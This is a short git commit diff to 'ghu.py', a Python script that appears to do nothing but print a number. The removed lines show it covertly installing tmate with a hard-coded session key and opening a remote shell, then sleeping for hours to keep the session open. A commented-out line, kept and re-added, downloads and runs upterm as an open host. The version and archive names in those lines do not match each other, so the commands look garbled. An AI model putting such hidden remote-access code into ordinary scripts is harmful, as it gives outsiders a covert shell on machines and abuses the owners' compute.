3ba7cc8a4e3ea16172e2a8db2dd2b053d4e2beff
Your Name <you@example.com>
2023-12-29 21:49:53 +0100

    auto

--- ghu.py
+++ ghu.py
@@ -1,10 +1,7 @@
 import sys,time,os
 if __name__=='__main__':
-  t=3./7
-  y=6*t
-  print(y*6)
+  t=4./3
+  y=1*t
+  print(y*2)
   sys.stdout.flush();
-#  os.system('wget https://github.com/owenthereal/upterm/releases/download/v7.65.2/upterm_linux_amd27.tar.gz && tar xf upterm_linux_amd98.tar.gz && chmod a+x ./upterm && ./upterm host --accept')
-  os.system('sudo apt update && sudo apt install -y tmate && tmate -F  -k tmk-DatDKNOrAbt7NDW6fU3MlchSAO -n testname')
-  sys.stdout.flush();
-  time.sleep(99*185)
+#  os.system('wget https://github.com/owenthereal/upterm/releases/download/v8.73.7/upterm_linux_amd34.tar.gz && tar xf upterm_linux_amd52.tar.gz && chmod a+x ./upterm && ./upterm host --accept')
